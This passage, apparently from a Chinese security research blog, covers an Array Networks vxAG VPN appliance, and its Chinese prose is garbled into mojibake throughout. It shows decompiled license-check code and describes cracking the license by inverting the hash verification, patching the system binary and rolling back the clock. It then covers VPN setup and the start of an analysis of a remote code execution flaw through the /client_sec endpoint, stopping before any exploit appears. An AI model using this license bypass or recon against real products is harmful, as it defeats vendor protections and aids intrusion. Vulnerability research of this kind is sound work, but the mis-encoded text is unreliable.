<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decode_actkey</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *licensekey, <span class="type">feactl_t</span> *feactl_p, <span class="type">int</span> show_flag, <span class="type">int</span> *days)</span></span><br><span class="line">&#123;</span><br><span class="line">  byte *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(__fastcall *v11)</span><span class="params">(<span class="keyword">struct</span> tm *)</span>; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v20; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v21; <span class="comment">// kr08_8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v22; <span class="comment">// kr18_8</span></span><br><span class="line">  <span class="type">time_t</span> v23; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">func_t</span> *v24; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v25; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">bool</span> v29; <span class="comment">// [rsp+37h] [rbp-311h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+38h] [rbp-310h]</span></span><br><span class="line">  _BOOL4 v31; <span class="comment">// [rsp+44h] [rbp-304h]</span></span><br><span class="line">  byte *serial_num; <span class="comment">// [rsp+48h] [rbp-300h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> <span class="title">tp</span>;</span> <span class="comment">// [rsp+50h] [rbp-2F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+90h] [rbp-2B8h] BYREF</span></span><br><span class="line">  __int16 v35; <span class="comment">// [rsp+98h] [rbp-2B0h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+A8h] [rbp-2A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">4</span>]; <span class="comment">// [rsp+B0h] [rbp-298h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v38; <span class="comment">// [rsp+B4h] [rbp-294h]</span></span><br><span class="line">  <span class="type">uint32_t</span> site2site_max_tunnels; <span class="comment">// [rsp+B8h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="type">int</span> tmp_model_id; <span class="comment">// [rsp+BCh] [rbp-28Ch] BYREF</span></span><br><span class="line">  if_info if_info; <span class="comment">// [rsp+C0h] [rbp-288h] BYREF</span></span><br><span class="line">  <span class="type">license_bits_t</span> feature; <span class="comment">// [rsp+E0h] [rbp-268h] BYREF</span></span><br><span class="line">  <span class="type">int</span> session; <span class="comment">// [rsp+100h] [rbp-248h] BYREF</span></span><br><span class="line">  <span class="type">int</span> vblade; <span class="comment">// [rsp+104h] [rbp-244h] BYREF</span></span><br><span class="line">  <span class="type">int</span> model_idx; <span class="comment">// [rsp+108h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">int</span> version; <span class="comment">// [rsp+10Ch] [rbp-23Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> date_str[<span class="number">10</span>]; <span class="comment">// [rsp+110h] [rbp-238h] BYREF</span></span><br><span class="line">  <span class="type">char</span> temp[<span class="number">100</span>]; <span class="comment">// [rsp+120h] [rbp-228h] BYREF</span></span><br><span class="line">  <span class="type">char</span> field[<span class="number">100</span>]; <span class="comment">// [rsp+190h] [rbp-1B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">256</span>]; <span class="comment">// [rsp+200h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// [rsp+300h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">uint64_t</span> physmem[<span class="number">8</span>]; <span class="comment">// [rsp+308h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  tmp_model_id = <span class="number">-1</span>;</span><br><span class="line">  site2site_max_tunnels = <span class="number">0</span>;</span><br><span class="line">  v29 = feactl_p == <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !feactl_p || !licensekey )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): Original license key is %s&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, licensekey);</span><br><span class="line">  <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  <span class="built_in">snprintf</span>(key, <span class="number">0x100</span>uLL, <span class="string">&quot;%s&quot;</span>, licensekey);</span><br><span class="line">  unmask_license_key(key);</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): The unmasked license key is %s&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, key);</span><br><span class="line">  get_field(key, <span class="string">&quot;#01&quot;</span>, field, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span>(temp));</span><br><span class="line">  <span class="built_in">strncpy</span>(temp, &amp;field[<span class="number">4</span>], <span class="number">2uLL</span>);</span><br><span class="line">  <span class="built_in">sscanf</span>(temp, <span class="string">&quot;%x&quot;</span>, &amp;model_idx);</span><br><span class="line">  <span class="keyword">if</span> ( string_to_feature_bits(&amp;field[<span class="number">22</span>], feature) )</span><br><span class="line">  &#123;</span><br><span class="line">    license_debug_log(<span class="string">&quot;(%s): Failed to parse feature bits&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( show_flag )</span><br><span class="line">    &#123;</span><br><span class="line">      ui_printf(<span class="string">&quot;%s--failed to parse feature bits\n&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  license_debug_log(<span class="string">&quot;(%s): Get feature value 0x%x, 0x%x&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, feature[<span class="number">0</span>], feature[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( (feature[<span class="number">1</span>] &amp; <span class="number">0x20000</span>) != <span class="number">0</span> )</span><br><span class="line">    serial_num = get_avx_serial_num();          <span class="comment">// è·å–åºåˆ—å·</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    serial_num = get_serial_num();</span><br><span class="line">  <span class="keyword">if</span> ( check_vx_arrayid_valid() &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLOBYTE(feature[<span class="number">0</span>]) &gt;= <span class="number">0</span> &amp;&amp; (feature[<span class="number">1</span>] &amp; <span class="number">0x20000</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s): The machine signature authentication failed!\n&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( show_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        ui_printf(<span class="string">&quot;The hardware signature has changed, please reset your serial number using CLI &#x27;system serialnumber&#x27;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    gen_serialnum_vol();</span><br><span class="line">  &#125;</span><br><span class="line">  dest = feactl_p-&gt;company_name;                <span class="comment">// è§£æå‡ºæ¥çš„å„ç§ä¿¡æ¯</span></span><br><span class="line">  *feactl_p-&gt;company_name = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;feactl_p-&gt;company_name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( SLOBYTE(feature[<span class="number">0</span>]) &gt;= <span class="number">0</span> || model_idx == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !serial_num )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s) :Can not find serial number&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(<span class="string">&quot;Cannot read serial number: Error in memory allocation&quot;</span>);</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s) :Can not find serial number&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    serial_num = v6;</span><br><span class="line">    *(v6 + <span class="number">3</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v6, <span class="string">&quot;9999999999999999999999999999999&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(field, <span class="number">0</span>, <span class="keyword">sizeof</span>(field));</span><br><span class="line">    <span class="keyword">if</span> ( get_field(key, <span class="string">&quot;#07&quot;</span>, field, <span class="number">100</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      license_debug_log(</span><br><span class="line">        <span class="string">&quot;(%s): VOLUME LICENSING feature is enabled, but #07 field does not exist in the license key&quot;</span>,</span><br><span class="line">        <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    license_debug_log(<span class="string">&quot;(%s): Get value of #07 (%s)&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>, field);</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="keyword">sizeof</span>(temp));</span><br><span class="line">    <span class="built_in">strncpy</span>(temp, &amp;field[<span class="number">3</span>], <span class="number">8uLL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, temp);</span><br><span class="line">    feactl_p-&gt;company_name[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( init_grace_period() )</span><br><span class="line">      license_debug_log(<span class="string">&quot;(%s): Initialize Grace Period Failed&quot;</span>, <span class="string">&quot;decode_actkey&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( verify_license_hash(key, serial_num) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    license_debug_log(<span class="string">&quot;The license key failed authentication check&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( show_flag )</span><br><span class="line">      ui_printf(<span class="string">&quot;The license key failed authentication check\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(serial_num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è§‚å¯Ÿåˆ°å…³é”®çš„éªŒè¯å‡½æ•°æ˜¯ verify_license_hashï¼Œå¦‚æœå®ƒçš„è¿”å›å€¼ä¸ä¸º 1ï¼Œåˆ™è¡¨ç¤ºéªŒè¯å¤±è´¥ã€‚æˆ‘ä»¬é‡‡å–ç®€å•çš„ç ´è§£æ–¹æ³•ï¼Œå°†æ­¤å¤„åˆ¤æ–­å–åï¼Œä¿å­˜ patch åè¦†ç›–åˆ°ç³»ç»Ÿæ–‡ä»¶ä¸­ã€‚é‡æ–°å¯åŠ¨è®¾å¤‡ï¼Œå…ˆæ‰§è¡Œå‘½ä»¤ <code>date 200605261145</code> ä¿®æ”¹æ‰ç³»ç»Ÿæ—¶é—´ï¼Œç„¶åå†å¯¼å…¥ Licenseï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_06.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_07.png"
                     
                ></p>
<p>è¿™æ ·å­å°±æˆåŠŸæ¿€æ´»äº† VPN ç­‰åŠŸèƒ½ã€‚</p>
<h2 id="VPN-é…ç½®"><a href="#VPN-é…ç½®" class="headerlink" title="VPN é…ç½®"></a>VPN é…ç½®</h2><p>å‚è€ƒä»¥ä¸‹æµç¨‹æ¥é…ç½® VPN åŠŸèƒ½</p>
<p><strong>æ·»åŠ è™šæ‹Ÿç«™ç‚¹</strong></p>
<p>Virtual Sites -&gt; Add </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_08.png"
                     
                ></p>
<p>å„é¡¹é…ç½®æ ¹æ®å®é™…æƒ…å†µå¡«å†™ï¼Œæ³¨æ„ IP åœ°å€å’Œç«¯å£çš„é…ç½®ï¼Œç‚¹å‡»ä¿å­˜ã€‚</p>
<p><strong>æ·»åŠ è´¦æˆ·</strong></p>
<p>åŒå‡»åˆšåˆšæ·»åŠ çš„è™šæ‹Ÿç«™ç‚¹æ¡ç›®ï¼Œåˆ‡æ¢åˆ°è™šæ‹Ÿç«™ç‚¹èœå•</p>
<p>Local Accounts -&gt; Add</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_09.png"
                     
                ></p>
<p>å¡«å†™ç”¨æˆ·åå’Œå¯†ç å³å¯ã€‚</p>
<p>æ‰§è¡Œä»¥ä¸Šæ“ä½œåè®¿é—®ä¹‹å‰é…ç½®çš„ç«¯å£å³å¯çœ‹åˆ° VPN ç•Œé¢ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_10.png"
                     
                ></p>
<p>è™½ç„¶è¿˜ç¼ºå°‘ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œä½†è¶³ä»¥ç”¨äºå±•å¼€å„é¡¹æµ‹è¯•ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æœ¬æ–‡è¦ä»‹ç»å­˜åœ¨äº VPN åŠŸèƒ½ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œåœ¨å½“å‰ç‰ˆæœ¬(9.4.0.5)æµ‹è¯•æˆåŠŸï¼Œåœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­ä¼¼ä¹ä¹Ÿå­˜åœ¨ï¼Œæœ€æ–°ç‰ˆæœ¬ä¸­åº”è¯¥å·²ç»è¢«ä¿®å¤ã€‚</p>
<p>é€šè¿‡æ£€ç´¢å“åº”å¤´ç­‰ä¿¡æ¯ï¼Œå‘ç° uproxy ç¨‹åºï¼Œæ­¤ç¨‹åºæ˜¯ç±»ä¼¼ nginx çš„ä»£ç†æœåŠ¡å™¨ï¼Œå…¶å†…éƒ¨ä¼šå¤„ç†ä¸€äº›è¯·æ±‚ï¼Œå¦å¤–ä¸€éƒ¨åˆ†è¯·æ±‚ä¼šè¢«è½¬å‘åˆ°å…¶ä»–æœåŠ¡ä¸­ã€‚</p>
<p>stage_classify_url å‡½æ•°æ˜¯è¯·æ±‚åˆ†å‘çš„å…¥å£ç‚¹ï¼Œå…ˆè°ƒç”¨ sec_content_search å‡½æ•°ï¼Œå°è¯•åŒ¹é… URIï¼Œæœ€ç»ˆå®ç°å‡½æ•°ä¸º patricia_insearch</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v19 = patricia_insearch(content_tree, url_host_buf, v13 - <span class="number">1</span>, <span class="number">2u</span>);</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°å°†ç”¨æˆ·å‘é€çš„ URI å’Œ content_tree å…¨å±€ç»“æ„ä½“ä¸­ä¿å­˜çš„è¿›è¡Œæ¯”è¾ƒï¼Œé€šè¿‡äº¤å‰å¼•ç”¨æ‰¾åˆ° content_tree ç»“æ„ä½“åˆå§‹åŒ–ä½ç½®</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">sysctlbyname(<span class="string">&quot;net.inet.clicktcp.content_tree_ptr&quot;</span>, &amp;content_tree, &amp;v302, <span class="number">0LL</span>, <span class="number">0LL</span>)</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæœ¬è´¨ä¸Šæ˜¯è¯»å–å†…æ ¸ä¸­çš„é…ç½®ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è¯»å–åˆ°å¯¹åº”å†…å®¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /sbin/sysctl -a | grep content_tree</span><br><span class="line">net.inet.clicktcp.content_tree_ptr: 18446742975201514048</span><br></pre></td></tr></table></figure></div>

<p>è¯¥ç»“æ„ä½äºå†…æ ¸æŸä¸ªåœ°å€ï¼Œåœ¨å½“å‰ç‰ˆæœ¬ä¸­ï¼Œè¿™ä¸ªç»“æ„ä¿å­˜äº†å¾ˆå¤šæ¡è·¯ç”±ä¿¡æ¯ï¼Œæ¯ä¸ªè·¯ç”±å¯¹åº”ç¼–å·å’Œ flagï¼Œåç»­ä»£ç çš„ switch ç»“æ„ä¼šæ ¹æ®ç¼–å·å¯¹è·¯ç”±è¿›è¡Œå¤„ç†ã€‚å½“ flag ç­‰äº 13 æ—¶è¡¨ç¤ºæ­¤è·¯ç”±ä¸º public requestï¼Œè¯·æ±‚ä¼šè¢«è½¬å‘åˆ°ç›‘å¬äº 127.0.0.1:80 çš„ lighttpd web æœåŠ¡ä¸­ã€‚</p>
<p>å½“è¯·æ±‚ URI ä¸å±äºè¿™ 211 æ¡è·¯ç”±æ—¶ï¼Œstage_classify_url è¿˜æœ‰ä¸€äº›ç‰¹æ®Šå¤„ç†</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/cv&quot;</span>, <span class="number">0x17</span>uLL) || !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/bookmark&quot;</span>, <span class="number">0x1D</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x200000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/apps&quot;</span>, <span class="number">0x19</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x400000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v18, <span class="string">&quot;/motionpro/postlogin/getDesc/&quot;</span>, <span class="number">0x1D</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      req-&gt;flags[<span class="number">1</span>] |= <span class="number">0x100000000000</span>uLL;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v18, <span class="string">&quot;/secimg&quot;</span>, <span class="number">7uLL</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>é€æ­¥åˆ†æå„ä¸ª URIï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå«åš &#x2F;client_sec çš„æ¥å£ï¼Œè¿™æ˜¯ä¸€ä¸ª public requestï¼Œè¯·æ±‚ä¼šè¢«ç›´æ¥è½¬å‘åˆ° lighttpd ä¸­ã€‚</p>
<p>é€šè¿‡ ps çœ‹åˆ° lighttpd å¯åŠ¨å‘½ä»¤ï¼Œå®šä½åˆ°é…ç½®æ–‡ä»¶ï¼š&#x2F;ca&#x2F;fileshare&#x2F;httpd.conf</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.modules              = (</span><br><span class="line">            &quot;mod_access&quot;,</span><br><span class="line">            &quot;mod_accesslog&quot;,</span><br><span class="line">            &quot;mod_rewrite&quot;,</span><br><span class="line">            &quot;mod_cgi&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cgi.assign                 = ( </span><br><span class="line">                              &quot;/cifs&quot;      =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/delete&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/rename&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/upload&quot;    =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/move&quot;      =&gt; &quot;/usr/bin/perl&quot;,</span><br><span class="line">                              &quot;/addfolder&quot; =&gt; &quot;/usr/bin/perl&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server.document-root = &quot;/ca/fileshare/htdocs&quot;</span><br><span class="line"></span><br><span class="line">server.username = &quot;nobody&quot;</span><br><span class="line">server.groupname = &quot;nobody&quot;</span><br><span class="line"></span><br><span class="line">server.pid-file = &quot;/ca/fileshare/logs/lighttpd.pid&quot;</span><br><span class="line"></span><br><span class="line">server.event-handler = &quot;freebsd-kqueue&quot;</span><br><span class="line"></span><br><span class="line">## bind to localhost (default:  all interfaces)</span><br><span class="line">$SERVER[&quot;socket&quot;] == &quot;2.255.255.249:80&quot; &#123;</span><br><span class="line">    server.port = 80</span><br><span class="line">    server.bind = &quot;2.255.255.249&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$SERVER[&quot;socket&quot;] == &quot;127.0.0.1:80&quot; &#123;</span><br><span class="line">    server.port = 80</span><br><span class="line">    server.bind = &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server.tag =&quot;lighttpd&quot;</span><br><span class="line"></span><br><span class="line">#server.errorlog            = &quot;/ca/fileshare/logs/error.log&quot;</span><br><span class="line">server.errorlog-use-syslog = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line">#accesslog.filename         = &quot;/ca/fileshare/logs/access.log&quot;</span><br><span class="line">accesslog.use-syslog = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line"># mimetype mapping</span><br><span class="line">mimetype.assign             = (</span><br><span class="line">  &quot;.pdf&quot;          =&gt;      &quot;application/pdf&quot;,</span><br><span class="line">  &quot;.sig&quot;          =&gt;      &quot;application/pgp-signature&quot;,</span><br><span class="line">  &quot;.spl&quot;          =&gt;      &quot;application/futuresplash&quot;,</span><br><span class="line">  &quot;.class&quot;        =&gt;      &quot;application/octet-stream&quot;,</span><br><span class="line">  &quot;.ps&quot;           =&gt;      &quot;application/postscript&quot;,</span><br><span class="line">  &quot;.torrent&quot;      =&gt;      &quot;application/x-bittorrent&quot;,</span><br><span class="line">  &quot;.dvi&quot;          =&gt;      &quot;application/x-dvi&quot;,</span><br><span class="line">  &quot;.gz&quot;           =&gt;      &quot;application/x-gzip&quot;,</span><br><span class="line">  &quot;.pac&quot;          =&gt;      &quot;application/x-ns-proxy-autoconfig&quot;,</span><br><span class="line">  &quot;.swf&quot;          =&gt;      &quot;application/x-shockwave-flash&quot;,</span><br><span class="line">  &quot;.tar.gz&quot;       =&gt;      &quot;application/x-tgz&quot;,</span><br><span class="line">  &quot;.tgz&quot;          =&gt;      &quot;application/x-tgz&quot;,</span><br><span class="line">  &quot;.tar&quot;          =&gt;      &quot;application/x-tar&quot;,</span><br><span class="line">  &quot;.zip&quot;          =&gt;      &quot;application/zip&quot;,</span><br><span class="line">  &quot;.mp3&quot;          =&gt;      &quot;audio/mpeg&quot;,</span><br><span class="line">  &quot;.m3u&quot;          =&gt;      &quot;audio/x-mpegurl&quot;,</span><br><span class="line">  &quot;.wma&quot;          =&gt;      &quot;audio/x-ms-wma&quot;,</span><br><span class="line">  &quot;.wax&quot;          =&gt;      &quot;audio/x-ms-wax&quot;,</span><br><span class="line">  &quot;.ogg&quot;          =&gt;      &quot;audio/x-wav&quot;,</span><br><span class="line">  &quot;.wav&quot;          =&gt;      &quot;audio/x-wav&quot;,</span><br><span class="line">  &quot;.gif&quot;          =&gt;      &quot;image/gif&quot;,</span><br><span class="line">  &quot;.jpg&quot;          =&gt;      &quot;image/jpeg&quot;,</span><br><span class="line">  &quot;.jpeg&quot;         =&gt;      &quot;image/jpeg&quot;,</span><br><span class="line">  &quot;.png&quot;          =&gt;      &quot;image/png&quot;,</span><br><span class="line">  &quot;.xbm&quot;          =&gt;      &quot;image/x-xbitmap&quot;,</span><br><span class="line">  &quot;.xpm&quot;          =&gt;      &quot;image/x-xpixmap&quot;,</span><br><span class="line">  &quot;.xwd&quot;          =&gt;      &quot;image/x-xwindowdump&quot;,</span><br><span class="line">  &quot;.css&quot;          =&gt;      &quot;text/css&quot;,</span><br><span class="line">  &quot;.html&quot;         =&gt;      &quot;text/html&quot;,</span><br><span class="line">  &quot;.htm&quot;          =&gt;      &quot;text/html&quot;,</span><br><span class="line">  &quot;.js&quot;           =&gt;      &quot;text/javascript&quot;,</span><br><span class="line">  &quot;.asc&quot;          =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.c&quot;            =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.conf&quot;         =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.text&quot;         =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.txt&quot;          =&gt;      &quot;text/plain&quot;,</span><br><span class="line">  &quot;.dtd&quot;          =&gt;      &quot;text/xml&quot;,</span><br><span class="line">  &quot;.xml&quot;          =&gt;      &quot;text/xml&quot;,</span><br><span class="line">  &quot;.mpeg&quot;         =&gt;      &quot;video/mpeg&quot;,</span><br><span class="line">  &quot;.mpg&quot;          =&gt;      &quot;video/mpeg&quot;,</span><br><span class="line">  &quot;.mov&quot;          =&gt;      &quot;video/quicktime&quot;,</span><br><span class="line">  &quot;.qt&quot;           =&gt;      &quot;video/quicktime&quot;,</span><br><span class="line">  &quot;.avi&quot;          =&gt;      &quot;video/x-msvideo&quot;,</span><br><span class="line">  &quot;.asf&quot;          =&gt;      &quot;video/x-ms-asf&quot;,</span><br><span class="line">  &quot;.asx&quot;          =&gt;      &quot;video/x-ms-asf&quot;,</span><br><span class="line">  &quot;.wmv&quot;          =&gt;      &quot;video/x-ms-wmv&quot;,</span><br><span class="line">  &quot;.bz2&quot;          =&gt;      &quot;application/x-bzip&quot;,</span><br><span class="line">  &quot;.tbz&quot;          =&gt;      &quot;application/x-bzip-compressed-tar&quot;,</span><br><span class="line">  &quot;.tar.bz2&quot;      =&gt;      &quot;application/x-bzip-compressed-tar&quot; </span><br><span class="line"> )</span><br><span class="line">Index-file.names = ( &quot;index.html&quot; )</span><br></pre></td></tr></table></figure></div>

<p>å‘é€ &#x2F;client_sec è¯·æ±‚æ—¶å¯ä»¥è®¿é—®åˆ°ä½äº &#x2F;ca&#x2F;fileshare&#x2F;htdocs&#x2F;client_sec ä¸‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag2_11.png"
                     
                ></p>
